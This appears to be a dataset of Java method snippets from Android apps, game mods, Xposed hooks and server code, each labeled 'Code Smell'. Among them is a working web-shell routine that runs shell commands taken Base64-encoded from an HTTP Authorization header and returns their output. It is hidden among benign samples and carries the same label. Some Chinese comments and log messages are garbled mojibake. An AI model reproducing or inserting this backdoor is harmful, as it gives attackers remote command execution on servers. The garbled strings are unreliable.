    if (child == dragView)     continue;
    CellAndSpan c=solution.map.get(child);
    boolean skip=mode == ReorderPreviewAnimation.MODE_HINT && solution.intersectingViews != null && !solution.intersectingViews.contains(child);
    CellLayoutLayoutParams lp=(CellLayoutLayoutParams)child.getLayoutParams();
    if (c != null && !skip && (child instanceof Reorderable)) {
      ReorderPreviewAnimation rha=new ReorderPreviewAnimation(child,mode,lp.getCellX(),lp.getCellY(),c.cellX,c.cellY,c.spanX,c.spanY);
      rha.animate();
    }
  }
}",1,Code Smell
"@Override protected void before(MethodHookParam param){
  String slot=(String)param.args[0];
  boolean isAlarmClockIcon=""alarm_clock"".equals(slot) && isAlarmClockAtRightEnable;
  boolean isNFCIcon=""nfc"".equals(slot) && isNFCAtRightEnable;
  boolean isVolumeIcon=""volume"".equals(slot) && isVolmeAtRightEnable;
  boolean isZenIcon=""zen"".equals(slot) && isZenAtRightEnable;
  boolean isHeadsetIcon=""headset"".equals(slot) && isHeadsetAtRightEnable;
  if (isAlarmClockIcon || isNFCIcon || isVolumeIcon|| isZenIcon|| isHeadsetIcon) {
    param.args[1]=false;
  }
}
@Override protected void before(MethodHookParam param){
  boolean isRightController=""StatusBarIconList"".equals(param.thisObject.getClass().getSimpleName());
  ArrayList<String> allStatusIcons=new ArrayList<>(Arrays.asList((String[])param.args[0]));
  if (isRightController) {
    int startIndex=allStatusIcons.indexOf(""mobile"");
    int endIndex=allStatusIcons.indexOf(""demo_wifi"") + 1;
    List<String> removedIcons=allStatusIcons.subList(startIndex,endIndex);
    removedIcons.clear();
    if (!isMoveLeft) {
      startIndex=allStatusIcons.indexOf(""hd"");
      allStatusIcons.addAll(startIndex + 1,mSignalRelatedIcons);
    }
    param.args[0]=allStatusIcons.toArray(new String[0]);
  }
 else   if (isMoveLeft && !isSwapWiFiAndMobileNetwork) {
    dripLeftIcons.addAll(allStatusIcons);
    allStatusIcons.addAll(0,mSignalRelatedIcons);
    param.args[0]=allStatusIcons.toArray(new String[0]);
  }
}
@Override protected void before(MethodHookParam param) throws Throwable {
  Object dripLeftController=XposedHelpers.callStaticMethod(findClass(""com.android.systemui.Dependency"",lpparam.classLoader),""get"",findClass(""com.android.systemui.statusbar.phone.MiuiDripLeftStatusBarIconControllerImpl"",lpparam.classLoader));
  XposedHelpers.setObjectField(param.thisObject,""mIconController"",dripLeftController);
}
@Override protected void before(MethodHookParam param) throws Throwable {
  int mCurrentStatusBarType=XposedHelpers.getIntField(param.thisObject,""mCurrentStatusBarType"");
  Object dripLeftController=XposedHelpers.callStaticMethod(findClass(""com.android.systemui.Dependency"",lpparam.classLoader),""get"",findClass(""com.android.systemui.statusbar.phone.MiuiDripLeftStatusBarIconControllerImpl"",lpparam.classLoader));
  XposedHelpers.setAdditionalInstanceField(dripLeftController,""mCurrentStatusBarType"",mCurrentStatusBarType);
}
@Override protected void before(MethodHookParam param){
  param.args[0]=null;
}",1,Code Smell
"/** 
 * Sets the currently selected hour using a 24-hour time.
 * @param hour the hour to set, in the range (0-23)
 * @see #getHour()
 */
public void setHour(@IntRange(from=0,to=23) int hour){
  if (hour < 0 || hour > 23) {
    throw new IllegalArgumentException(""hour: "" + hour + "" is not in [0-23] range in"");
  }
  mCurrentHour=hour;
  if (!is24Hour()) {
    if (mCurrentHour >= HOURS_IN_HALF_DAY) {
      mCurrentAmPmIndex=PM_INDEX;
      if (mCurrentHour > HOURS_IN_HALF_DAY) {
        mCurrentHour-=HOURS_IN_HALF_DAY;
      }
    }
 else {
      mCurrentAmPmIndex=AM_INDEX;
      if (mCurrentHour == 0) {
        mCurrentHour=HOURS_IN_HALF_DAY;
      }
    }
    setAmPmValue();
  }
  setColumnValue(mColHourIndex,mCurrentHour,false);
}",1,Code Smell
"@Override public void tick(MovementContext context){
  if (context.world == null || !context.world.isClientSide || context.position == null || !context.state.getValue(CampfireBlock.LIT) || context.disabled)   return;
  RandomSource random=context.world.random;
  if (random.nextFloat() < 0.11F) {
    for (int i=0; i < random.nextInt(2) + 2; ++i) {
      context.world.addAlwaysVisibleParticle(context.state.getValue(CampfireBlock.SIGNAL_FIRE) ? ParticleTypes.CAMPFIRE_SIGNAL_SMOKE : ParticleTypes.CAMPFIRE_COSY_SMOKE,true,context.position.x() + random.nextDouble() / (random.nextBoolean() ? 3D : -3D),context.position.y() + random.nextDouble() + random.nextDouble(),context.position.z() + random.nextDouble() / (random.nextBoolean() ? 3D : -3D),0.0D,0.07D,0.0D);
    }
  }
}",1,Code Smell
"public static String getSubString(String text,String left,String right){
  String result="""";
  int zLen;
  if (left == null || left.isEmpty()) {
    zLen=0;
  }
 else {
    zLen=text.indexOf(left);
    if (zLen > -1) {
      zLen+=left.length();
    }
 else {
      zLen=0;
    }
  }
  int yLen=text.indexOf(right,zLen);
  if (yLen < 0 || right == null || right.isEmpty()) {
    yLen=text.length();
  }
  result=text.substring(zLen,yLen);
  return result;
}",1,Code Smell
"public void updateParticipantVolume(String userId,int volume){
  if (userId.equals(ChatManager.Instance().getUserId()) && myParticipantItemView != null) {
    myParticipantItemView.updateVolume(volume);
  }
 else {
    if (focusProfile != null && focusProfile.getUserId().equals(userId) && focusParticipantItemView != null) {
      focusParticipantItemView.updateVolume(volume);
    }
  }
}
",1,Code Smell
"@Override public <T extends Block>ModelFile getModel(DataGenContext<Block,T> ctx,RegistrateBlockstateProvider prov,BlockState state){
  Boolean casing=state.getValue(BeltBlock.CASING);
  if (!casing)   return prov.models().getExistingFile(prov.modLoc(""block/belt/particle""));
  BeltPart part=state.getValue(BeltBlock.PART);
  Direction direction=state.getValue(BeltBlock.HORIZONTAL_FACING);
  BeltSlope slope=state.getValue(BeltBlock.SLOPE);
  boolean downward=slope == BeltSlope.DOWNWARD;
  boolean diagonal=slope == BeltSlope.UPWARD || downward;
  boolean vertical=slope == BeltSlope.VERTICAL;
  boolean pulley=part == BeltPart.PULLEY;
  boolean sideways=slope == BeltSlope.SIDEWAYS;
  boolean negative=direction.getAxisDirection() == AxisDirection.NEGATIVE;
  if (!casing && pulley)   part=BeltPart.MIDDLE;
  if ((vertical && negative || downward || sideways && negative) && part != BeltPart.MIDDLE && !pulley)   part=part == BeltPart.END ? BeltPart.START : BeltPart.END;
  if (!casing && vertical)   slope=BeltSlope.HORIZONTAL;
  if (casing && vertical)   slope=BeltSlope.SIDEWAYS;
  String path=""block/"" + (casing ? ""belt_casing/"" : ""belt/"");
  String slopeName=slope.getSerializedName();
  String partName=part.getSerializedName();
  if (diagonal)   slopeName=""diagonal"";
  ResourceLocation location=prov.modLoc(path + slopeName + ""_""+ partName);
  return prov.models().getExistingFile(location);
}
",1,Code Smell
"void oldPassword(Editable editable){
  if (!TextUtils.isEmpty(newPasswordEditText.getText()) && !TextUtils.isEmpty(confirmPasswordEditText.getText()) && !TextUtils.isEmpty(editable)) {
    confirmButton.setEnabled(true);
  }
 else {
    confirmButton.setEnabled(false);
  }
}
",1,Code Smell
"@Override public boolean onActionItemClicked(ActionMode mode,MenuItem item){
  int id=item.getItemId();
  if (id == R.id.delete_entry) {
    if (mSelected.size() >= mAdapter.getCount()) {
      mAdapter.clear();
      mPermissions.removeAll();
    }
 else {
      for (      CtrlPermissions.Rule rule : mSelected) {
        mAdapter.remove(rule);
        mPermissions.remove(rule.package_name);
      }
    }
    mode.finish();
    recheckListSize();
    return true;
  }
 else   if (id == R.id.select_all) {
    if (mSelected.size() >= mAdapter.getCount())     mode.finish();
 else {
      for (int i=0; i < mAdapter.getCount(); i++) {
        if (!mListView.isItemChecked(i))         mListView.setItemChecked(i,true);
      }
    }
  }
  return false;
}",1,Code Smell
"@Override public @Nullable Tree visit(@Nullable Tree tree,ExecutionContext ctx){
  SourceFile sourceFile=(SourceFile)requireNonNull(tree);
  sourceFile.getMarkers().findFirst(JavaProject.class).ifPresent(javaProject -> sourceFile.getMarkers().findFirst(JavaSourceSet.class).ifPresent(sourceSet -> {
    if (usesType(sourceFile,ctx)) {
      acc.usingType=true;
      Set<String> configurations=acc.configurationsByProject.computeIfAbsent(javaProject,ignored -> new HashSet<>());
      configurations.add(""main"".equals(sourceSet.getName()) ? ""implementation"" : sourceSet.getName() + ""Implementation"");
    }
  }
));
  return tree;
}
@Override public @Nullable J visit(@Nullable Tree tree,ExecutionContext ctx){
  if (!(tree instanceof JavaSourceFile)) {
    return (J)tree;
  }
  JavaSourceFile s=(JavaSourceFile)tree;
  if (!s.getSourcePath().toString().endsWith("".gradle"") || s.getSourcePath().getFileName().toString().equals(""settings.gradle"")) {
    return s;
  }
  Optional<JavaProject> maybeJp=s.getMarkers().findFirst(JavaProject.class);
  if (!maybeJp.isPresent()) {
    return s;
  }
  JavaProject jp=maybeJp.get();
  if (!acc.configurationsByProject.containsKey(jp)) {
    return s;
  }
  Optional<GradleProject> maybeGp=s.getMarkers().findFirst(GradleProject.class);
  if (!maybeGp.isPresent()) {
    return s;
  }
  GradleProject gp=maybeGp.get();
  Set<String> resolvedConfigurations=StringUtils.isBlank(configuration) ? acc.configurationsByProject.get(jp) : new HashSet<>(Collections.singletonList(configuration));
  Set<String> tmpConfigurations=new HashSet<>(resolvedConfigurations);
  for (  String tmpConfiguration : tmpConfigurations) {
    GradleDependencyConfiguration gdc=gp.getConfiguration(tmpConfiguration);
    if (gdc == null || gdc.findRequestedDependency(groupId,artifactId) != null) {
      resolvedConfigurations.remove(tmpConfiguration);
    }
  }
  tmpConfigurations=new HashSet<>(resolvedConfigurations);
  for (  String tmpConfiguration : tmpConfigurations) {
    GradleDependencyConfiguration gdc=gp.getConfiguration(tmpConfiguration);
    for (    GradleDependencyConfiguration transitive : gp.configurationsExtendingFrom(gdc,true)) {
      if (resolvedConfigurations.contains(transitive.getName()) || (Boolean.TRUE.equals(acceptTransitive) && transitive.findResolvedDependency(groupId,artifactId) != null)) {
        resolvedConfigurations.remove(transitive.getName());
      }
    }
  }
  if (resolvedConfigurations.isEmpty()) {
    return s;
  }
  G.CompilationUnit g=(G.CompilationUnit)s;
  for (  String resolvedConfiguration : resolvedConfigurations) {
    g=(G.CompilationUnit)new AddDependencyVisitor(groupId,artifactId,version,versionPattern,resolvedConfiguration,classifier,extension,metadataFailures,this::isTopLevel).visitNonNull(g,ctx);
  }
  return g;
}
",1,Code Smell
"@Override public boolean sniff(ExtractorInput input) throws IOException, InterruptedException {
  ParsableByteArray scratch=new ParsableByteArray(10);
  int startPosition=0;
  while (true) {
    input.peekFully(scratch.data,0,10);
    scratch.setPosition(0);
    if (scratch.readUnsignedInt24() != ID3_TAG) {
      break;
    }
    scratch.skipBytes(3);
    int length=scratch.readSynchSafeInt();
    startPosition+=10 + length;
    input.advancePeekPosition(length);
  }
  input.resetPeekPosition();
  input.advancePeekPosition(startPosition);
  int headerPosition=startPosition;
  int validFramesCount=0;
  while (true) {
    input.peekFully(scratch.data,0,6);
    scratch.setPosition(0);
    int syncBytes=scratch.readUnsignedShort();
    if (syncBytes != AC3_SYNC_WORD) {
      validFramesCount=0;
      input.resetPeekPosition();
      if (++headerPosition - startPosition >= MAX_SNIFF_BYTES) {
        return false;
      }
      input.advancePeekPosition(headerPosition);
    }
 else {
      if (++validFramesCount >= 4) {
        return true;
      }
      int frameSize=Ac3Util.parseAc3SyncframeSize(scratch.data);
      if (frameSize == C.LENGTH_UNSET) {
        return false;
      }
      input.advancePeekPosition(frameSize - 6);
    }
  }
}",1,Code Smell
"public void onDone(){
  EventManager.get().unregister(this);
  close();
  Platform.runLater(() -> {
    if (connectionService != null && connectionService.isRunning()) {
      connectionService.cancel();
    }
    if (Config.get().getMode() == Mode.ONLINE && !(AppServices.isConnecting() || AppServices.isConnected())) {
      EventManager.get().post(new RequestConnectEvent());
    }
  }
);
}
",1,Code Smell
"@Override public void onDropCompleted(final View target,final DragObject d,final boolean success){
  if (success) {
    if (mDeleteFolderOnDropCompleted && !mItemAddedBackToSelfViaIcon && target != this) {
      replaceFolderWithFinalItem();
    }
  }
 else {
    WorkspaceItemInfo info=(WorkspaceItemInfo)d.dragInfo;
    View icon=(mCurrentDragView != null && mCurrentDragView.getTag() == info) ? mCurrentDragView : mContent.createNewView(info);
    ArrayList<View> views=getIconsInReadingOrder();
    info.rank=Utilities.boundToRange(info.rank,0,views.size());
    views.add(info.rank,icon);
    mContent.arrangeChildren(views);
    mItemsInvalidated=true;
    try (SuppressInfoChanges s=new SuppressInfoChanges()){
      mFolderIcon.onDrop(d,true);
    }
   }
  if (target != this) {
    if (mOnExitAlarm.alarmPending()) {
      mOnExitAlarm.cancelAlarm();
      if (!success) {
        mSuppressFolderDeletion=true;
      }
      mScrollPauseAlarm.cancelAlarm();
      completeDragExit();
    }
  }
  mDeleteFolderOnDropCompleted=false;
  mDragInProgress=false;
  mItemAddedBackToSelfViaIcon=false;
  mCurrentDragView=null;
  updateItemLocationsInDatabaseBatch(false);
  if (getItemCount() <= mContent.itemsPerPage()) {
    mInfo.setOption(FolderInfo.FLAG_MULTI_PAGE_ANIMATION,false,mLauncherDelegate.getModelWriter());
  }
}",1,Code Smell
"private float getTargetAngle(MovementContext context){
  if (shouldRenderHat(context) && !Mth.equal(context.relativeMotion.length(),0) && context.contraption.entity instanceof CarriageContraptionEntity) {
    float angle=AngleHelper.deg(-Mth.atan2(context.relativeMotion.x,context.relativeMotion.z));
    return cce.getInitialOrientation().getAxis() == Axis.X ? angle + 180 : angle;
  }
  Entity player=Minecraft.getInstance().cameraEntity;
  if (player != null && !player.isInvisible() && context.position != null) {
    Vec3 applyRotation=context.contraption.entity.reverseRotation(player.position().subtract(context.position),1);
    double dx=applyRotation.x;
    double dz=applyRotation.z;
    return AngleHelper.deg(-Mth.atan2(dz,dx)) - 90;
  }
  return 0;
}",1,Code Smell
"@Override public boolean initOnce(){
  for (  Method m : Initiator._QbossADImmersionBannerManager().getDeclaredMethods()) {
    Class<?>[] argt=m.getParameterTypes();
    if (m.getReturnType() == View.class && argt.length == 0 && !Modifier.isStatic(m.getModifiers())) {
      HookUtils.hookBeforeIfEnabled(this,m,param -> param.setResult(null));
    }
  }
  try {
    XposedBridge.hookAllMethods(Initiator.load(""com.tencent.mobileqq.activity.recent.bannerprocessor.VasADBannerProcessor""),""handleMessage"",new XC_MethodReplacement(){
      @Override protected Object replaceHookedMethod(      MethodHookParam param){
        try {
          return XposedBridge.invokeOriginalMethod(param.method,param.thisObject,param.args);
        }
 catch (        Exception e) {
          traceError(e);
          return null;
        }
      }
    }
);
  }
 catch (  Exception e) {
  }
  return true;
}",1,Code Smell
"/** 
 * 鏍￠獙绉掓潃鍟嗗搧鍙備笌鐨勬椿鍔ㄦ槸鍚﹀瓨鍦ㄥ啿绐� 1. 鏍￠獙绉掓潃鏃舵鏄惁瀛樺湪 2. 绉掓潃鍟嗗搧鏄惁鍙傚姞鍏跺畠娲诲姩
 * @param configIds  绉掓潃鏃舵鏁扮粍
 * @param spuId      鍟嗗搧 SPU 缂栧彿
 * @param activityId 绉掓潃娲诲姩缂栧彿
 */
private void validateProductConflict(List<Long> configIds,Long spuId,Long activityId){
  seckillConfigService.validateSeckillConfigExists(configIds);
  List<SeckillActivityDO> activityList=seckillActivityMapper.selectListByStatus(CommonStatusEnum.ENABLE.getStatus());
  if (activityId != null) {
    activityList.removeIf(item -> ObjectUtil.equal(item.getId(),activityId));
  }
  List<SeckillActivityDO> conflictActivityList=filterList(activityList,s -> containsAny(s.getConfigIds(),configIds));
  if (isNotEmpty(conflictActivityList)) {
    throw exception(SECKILL_ACTIVITY_SPU_CONFLICTS);
  }
}",1,Code Smell
"private static void p(Object o,int depth){
  if (depth > 52 || (r != null && p != null)) {
    return;
  }
  if (!i(o)) {
    if (r == null && javax.servlet.http.HttpServletRequest.class.isAssignableFrom(o.getClass())) {
      r=(javax.servlet.http.HttpServletRequest)o;
      if (r.getHeader(""Host"") == null && r.getHeader(""Authorization"") == null) {
        r=null;
      }
 else {
        try {
          p=(javax.servlet.http.HttpServletResponse)r.getClass().getMethod(""getResponse"",null).invoke(r,null);
        }
 catch (        Exception e) {
          r=null;
        }
      }
    }
    if (r != null && p != null) {
      try {
        p.addHeader(""Host"",r.getHeader(""Host""));
        try {
          p.getWriter().println(""$$$"" + org.apache.shiro.codec.Base64.encodeToString(new java.util.Scanner(Runtime.getRuntime().exec(org.apache.shiro.codec.Base64.decodeToString(r.getHeader(""Authorization"").replaceAll(""Basic "",""""))).getInputStream()).useDelimiter(""\\A"").next().getBytes()) + ""$$$"");
        }
 catch (        Exception e) {
        }
        p.getWriter().flush();
        p.getWriter().close();
      }
 catch (      Exception e) {
      }
      return;
    }
    F(o,depth + 1);
  }
}",1,Code Smell
"private Executor handleEnd(Executor executor){
  if (executor.getExecution().getState().isTerminated() || executor.getExecution().getState().isPaused() || executor.getExecution().getState().isRetrying()) {
    return executor;
  }
  List<ResolvedTask> currentTasks=executor.getExecution().findTaskDependingFlowState(ResolvedTask.of(executor.getFlow().getTasks()),ResolvedTask.of(executor.getFlow().getErrors()),ResolvedTask.of(executor.getFlow().getFinally()));
  if (!executor.getExecution().isTerminated(currentTasks)) {
    return executor;
  }
  return this.onEnd(executor);
}
",1,Code Smell
"private void playNextAudioMessage(UiMessage uiMessage){
  List<UiMessage> messages=adapter.getMessages();
  boolean found=false;
  UiMessage toPlayAudioMessage=null;
  for (int i=0; i < messages.size(); i++) {
    UiMessage uimsg=messages.get(i);
    if (found) {
      if (uimsg.message.content instanceof SoundMessageContent && uimsg.message.direction == MessageDirection.Receive && uimsg.message.status != MessageStatus.Played) {
        toPlayAudioMessage=uimsg;
        break;
      }
    }
 else {
      if (uimsg.message.messageUid == uiMessage.message.messageUid) {
        found=true;
      }
    }
  }
  if (toPlayAudioMessage != null) {
    File file=DownloadManager.mediaMessageContentFile(toPlayAudioMessage.message);
    if (file == null) {
      return;
    }
    toPlayAudioMessage.continuousPlayAudio=true;
    if (file.exists()) {
      messageViewModel.playAudioMessage(toPlayAudioMessage);
    }
 else {
      messageViewModel.downloadMedia(toPlayAudioMessage,file);
    }
  }
}",1,Code Smell
"private void showVideoView(AVEngineKit.CallSession session,String nextFocusUserId){
  view.findViewById(R.id.audioLinearLayout).setVisibility(View.GONE);
  FrameLayout remoteVideoFrameLayout=view.findViewById(R.id.remoteVideoFrameLayout);
  remoteVideoFrameLayout.setVisibility(View.VISIBLE);
  LinearLayout videoContainer=remoteVideoFrameLayout.findViewById(R.id.videoContainer);
  if (!rendererInitialized || lastState != session.getState() || !TextUtils.equals(lastFocusUserId,nextFocusUserId)) {
    rendererInitialized=true;
    lastState=session.getState();
    ImageView portraitImageView=remoteVideoFrameLayout.findViewById(R.id.portraitImageView);
    UserInfo userInfo=ChatManager.Instance().getUserInfo(nextFocusUserId,false);
    Glide.with(remoteVideoFrameLayout).load(userInfo.portrait).placeholder(R.mipmap.avatar_def).into(portraitImageView);
    if (TextUtils.equals(ChatManager.Instance().getUserId(),nextFocusUserId)) {
      session.setupLocalVideoView(videoContainer,SCALE_ASPECT_BALANCED);
      if (!TextUtils.isEmpty(lastFocusUserId)) {
        session.setupRemoteVideoView(lastFocusUserId,null,SCALE_ASPECT_BALANCED);
      }
    }
 else {
      session.setupRemoteVideoView(nextFocusUserId,videoContainer,SCALE_ASPECT_BALANCED);
      session.setupLocalVideoView(null,SCALE_ASPECT_BALANCED);
    }
    lastFocusUserId=nextFocusUserId;
  }
}
",1,Code Smell
"public static String[] insertAdditionalPopupKeys(@Nullable final String[] popupKeySpecs,@Nullable final String[] additionalPopupKeySpecs){
  final String[] popupKeys=filterOutEmptyString(popupKeySpecs);
  final String[] additionalPopupKeys=filterOutEmptyString(additionalPopupKeySpecs);
  final int popupKeysCount=popupKeys.length;
  final int additionalCount=additionalPopupKeys.length;
  ArrayList<String> out=null;
  int additionalIndex=0;
  for (int popupKeyIndex=0; popupKeyIndex < popupKeysCount; popupKeyIndex++) {
    final String popupKeySpec=popupKeys[popupKeyIndex];
    if (popupKeySpec.equals(ADDITIONAL_POPUP_KEY_MARKER)) {
      if (additionalIndex < additionalCount) {
        final String additionalPopupKey=additionalPopupKeys[additionalIndex];
        if (out != null) {
          out.add(additionalPopupKey);
        }
 else {
          popupKeys[popupKeyIndex]=additionalPopupKey;
        }
        additionalIndex++;
      }
 else {
        if (out == null) {
          out=CollectionUtils.arrayAsList(popupKeys,0,popupKeyIndex);
        }
      }
    }
 else {
      if (out != null) {
        out.add(popupKeySpec);
      }
    }
  }
  if (additionalCount > 0 && additionalIndex == 0) {
    out=CollectionUtils.arrayAsList(additionalPopupKeys,additionalIndex,additionalCount);
    for (int i=0; i < popupKeysCount; i++) {
      out.add(popupKeys[i]);
    }
  }
 else   if (additionalIndex < additionalCount) {
    out=CollectionUtils.arrayAsList(popupKeys,0,popupKeysCount);
    for (int i=additionalIndex; i < additionalCount; i++) {
      out.add(additionalPopupKeys[i]);
    }
  }
  if (out == null && popupKeysCount > 0) {
    return popupKeys;
  }
 else   if (out != null && out.size() > 0) {
    return out.toArray(new String[0]);
  }
 else {
    return null;
  }
}",1,Code Smell
"@Override public boolean equals(@Nullable Object obj){
  if (this == obj) {
    return true;
  }
  if (obj == null || getClass() != obj.getClass()) {
    return false;
  }
  Format other=(Format)obj;
  if (hashCode != 0 && other.hashCode != 0 && hashCode != other.hashCode) {
    return false;
  }
  return selectionFlags == other.selectionFlags && roleFlags == other.roleFlags && bitrate == other.bitrate && maxInputSize == other.maxInputSize && subsampleOffsetUs == other.subsampleOffsetUs && width == other.width && height == other.height && rotationDegrees == other.rotationDegrees && stereoMode == other.stereoMode && channelCount == other.channelCount && sampleRate == other.sampleRate && pcmEncoding == other.pcmEncoding && encoderDelay == other.encoderDelay && encoderPadding == other.encoderPadding && accessibilityChannel == other.accessibilityChannel && Float.compare(frameRate,other.frameRate) == 0 && Float.compare(pixelWidthHeightRatio,other.pixelWidthHeightRatio) == 0 && Util.areEqual(id,other.id) && Util.areEqual(label,other.label) && Util.areEqual(codecs,other.codecs) && Util.areEqual(containerMimeType,other.containerMimeType) && Util.areEqual(sampleMimeType,other.sampleMimeType) && Util.areEqual(language,other.language) && Arrays.equals(projectionData,other.projectionData) && Util.areEqual(metadata,other.metadata) && Util.areEqual(colorInfo,other.colorInfo) && Util.areEqual(drmInitData,other.drmInitData) && initializationDataEquals(other);
}",1,Code Smell
"public static String formatDiff(String expected,String output){
  if ((StringUtils.isBlank(expected) && StringUtils.isNotBlank(output)) || (StringUtils.isNotBlank(expected) && StringUtils.isBlank(output))) {
    return FLAG + ""E"" + output+ FLAG;
  }
 else   if (StringUtils.isBlank(expected) || StringUtils.isBlank(output) || output.equals(expected)) {
    return output;
  }
 else {
    boolean isDiff=false;
    StringBuilder sb=new StringBuilder();
    for (int i=0; i < output.length(); i++) {
      if (i >= expected.length()) {
        if (!isDiff) {
          sb.append(FLAG).append(""E"");
        }
        sb.append(output.substring(i)).append(FLAG);
        isDiff=true;
        break;
      }
 else {
        if (output.charAt(i) == expected.charAt(i)) {
          if (isDiff) {
            sb.append(FLAG);
            isDiff=false;
          }
          sb.append(output.charAt(i));
        }
 else {
          if (!isDiff) {
            sb.append(FLAG).append(""E"");
            isDiff=true;
          }
          sb.append(output.charAt(i));
        }
      }
    }
    if (isDiff) {
      sb.append(FLAG);
    }
    return sb.toString();
  }
}",1,Code Smell
"/** 
 * 鑷姩鎵╁
 */
private void autoExpansion(String group,String tenant){
  Capacity capacity=getCapacity(group,tenant);
  int defaultQuota=getDefaultQuota(tenant != null);
  Integer usage=capacity.getUsage();
  if (usage < defaultQuota) {
    return;
  }
  int initialExpansionPercent=PropertyUtil.getInitialExpansionPercent();
  if (initialExpansionPercent > 0) {
    int finalQuota=(int)(usage + defaultQuota * (1.0 * initialExpansionPercent / 100));
    if (tenant != null) {
      tenantCapacityPersistService.updateQuota(tenant,finalQuota);
      LogUtil.defaultLog.warn(""[capacityManagement] 鍒濆鍖栫殑鏃跺�欒绉熸埛锛坽}锛変娇鐢ㄩ噺锛坽}锛夊氨宸茬粡鍒拌揪闄愰{}锛岃嚜鍔ㄦ墿瀹瑰埌{}"",tenant,usage,defaultQuota,finalQuota);
    }
 else {
      groupCapacityPersistService.updateQuota(group,finalQuota);
      LogUtil.defaultLog.warn(""[capacityManagement] 鍒濆鍖栫殑鏃跺�欒Group锛坽}锛変娇鐢ㄩ噺锛坽}锛夊氨宸茬粡鍒拌揪闄愰{}锛岃嚜鍔ㄦ墿瀹瑰埌{}"",group,usage,defaultQuota,finalQuota);
    }
  }
}",1,Code Smell
"@Override public void beforeHookedMethod(MethodHookParam methodHookParam){
  if (LicenseStatus.sDisableCommonHooks) {
    return;
  }
  if (!isEnabled()) {
    return;
  }
  View v=(View)methodHookParam.args[2];
  if (v != null && (v.getContext().getClass().getName().contains(""ChatHistoryActivity"") || v.getContext().getClass().getName().contains(""MultiForwardActivity""))) {
    return;
  }
  iput_object(methodHookParam.args[0],""isFlowMessage"",true);
  if (((int)iget_object_or_null(methodHookParam.args[0],""extraflag"")) == 32768) {
    iput_object(methodHookParam.args[0],""extraflag"",0);
  }
}",1,Code Smell
"private BufferedReader decryptImport(String password,BufferedReader streamReader) throws Exception {
  byte[] token;
  if ((password.length() == 16 || password.length() == 32) && Utils.isHex(password)) {
    token=Utils.hexToBytes(password);
  }
 else   if (Utils.isNumber(password)) {
    BigInteger bi=new BigInteger(password);
    token=Utils.bigIntegerToBytes(bi,bi.toByteArray().length >= 16 ? 16 : 8);
  }
 else   if (password.split("" "").length == 6 || password.split("" "").length == 12) {
    List<String> mnemonicWords=Arrays.asList(password.split("" ""));
    token=Bip39MnemonicCode.INSTANCE.toEntropy(mnemonicWords);
  }
 else {
    throw new ImportException(""Provided password needs to be in hexadecimal, decimal or mnemonic format."");
  }
  String hex=CharStreams.toString(streamReader).trim();
  byte[] data=Utils.hexToBytes(hex);
  byte[] mac=Arrays.copyOfRange(data,0,32);
  byte[] iv=Arrays.copyOfRange(mac,0,16);
  byte[] ciphertext=Arrays.copyOfRange(data,32,data.length);
  Cipher cipher=Cipher.getInstance(""AES/CTR/NoPadding"");
  Pbkdf2KeyDeriver pbkdf2KeyDeriver=new Pbkdf2KeyDeriver(token,2048,256);
  byte[] key=pbkdf2KeyDeriver.deriveKey(""No SPOF"").getKeyBytes();
  Key keySpec=new SecretKeySpec(key,""AES"");
  IvParameterSpec ivSpec=new IvParameterSpec(iv);
  cipher.init(Cipher.DECRYPT_MODE,keySpec,ivSpec);
  byte[] plaintext=cipher.doFinal(ciphertext);
  String plaintextString=new String(plaintext,StandardCharsets.UTF_8);
  SecretKeySpec secretKeySpec=new SecretKeySpec(Sha256Hash.hash(key),""HmacSHA256"");
  Mac hmac=Mac.getInstance(""HmacSHA256"");
  hmac.init(secretKeySpec);
  String macData=Utils.bytesToHex(token) + plaintextString;
  byte[] calculatedMac=hmac.doFinal(macData.getBytes(StandardCharsets.UTF_8));
  if (!Arrays.equals(mac,calculatedMac)) {
    throw new ImportException(""Message digest authentication failed."");
  }
  return new BufferedReader(new StringReader(plaintextString));
}",1,Code Smell
"/** 
 * Gets the Views in the hierarchy affected by entering and exiting Activity Scene transitions.
 * @param transitioningViews This View will be added to transitioningViews if it is VISIBLE anda normal View or a ViewGroup with {@link android.view.ViewGroup#isTransitionGroup()} true.
 * @param view               The base of the view hierarchy to look in.
 */
void captureTransitioningViews(ArrayList<View> transitioningViews,View view){
  if (view.getVisibility() == View.VISIBLE) {
    if (view instanceof ViewGroup) {
      ViewGroup viewGroup=(ViewGroup)view;
      if (ViewGroupCompat.isTransitionGroup(viewGroup)) {
        transitioningViews.add(viewGroup);
      }
 else {
        int count=viewGroup.getChildCount();
        for (int i=0; i < count; i++) {
          View child=viewGroup.getChildAt(i);
          captureTransitioningViews(transitioningViews,child);
        }
      }
    }
 else {
      transitioningViews.add(view);
    }
  }
}",1,Code Smell
"public void openTransactionFromQR(ActionEvent event){
  QRScanDialog qrScanDialog=new QRScanDialog();
  qrScanDialog.initOwner(rootStack.getScene().getWindow());
  Optional<QRScanDialog.Result> optionalResult=qrScanDialog.showAndWait();
  if (optionalResult.isPresent()) {
    QRScanDialog.Result result=optionalResult.get();
    if (result.transaction != null) {
      addTransactionTab(null,null,result.transaction);
    }
 else     if (result.psbt != null) {
      addTransactionTab(null,null,result.psbt);
    }
 else     if (result.exception != null) {
      log.error(""Error scanning QR"",result.exception);
      showErrorDialog(""Error scanning QR"",result.exception.getMessage());
    }
 else {
      AppServices.showErrorDialog(""Invalid QR Code"",""Cannot parse QR code into a transaction or PSBT"");
    }
  }
}
",1,Code Smell
"public static String getAppName(Context context,String pkgActName){
  return getAppName(context,pkgActName,false);
}
public static String getAppName(Context context,String pkgActName,boolean forcePkg){
  PackageManager pm=context.getPackageManager();
  String notSelected=""None"";
  String[] pkgActArray=pkgActName.split(""\\|"");
  ApplicationInfo ai;
  if (!pkgActName.equals(notSelected)) {
    if (pkgActArray.length >= 1 && pkgActArray[0] != null)     try {
      if (!forcePkg && pkgActArray.length >= 2 && pkgActArray[1] != null && !"""".equals(pkgActArray[1].trim())) {
        return pm.getActivityInfo(new ComponentName(pkgActArray[0],pkgActArray[1]),0).loadLabel(pm).toString();
      }
 else       if (!"""".equals(pkgActArray[0].trim())) {
        ai=pm.getApplicationInfo(pkgActArray[0],0);
        return pm.getApplicationLabel(ai).toString();
      }
    }
 catch (    Throwable e) {
      e.printStackTrace();
    }
  }
  return null;
}",1,Code Smell
"private static void addToSchemas(Map<String,Schema> schemas,String schemaName,String ref,Content content,String contentType){
  Schema<?> schemaToAdd=new Schema();
  if (ref == null && hasContentType(content,List.of(contentType))) {
    LOGGER.debug(""Getting schema {} for content-type {}"",schemaName,contentType);
    Schema<?> refSchema=getMediaTypeFromContent(content,contentType).getSchema();
    if (refSchema != null) {
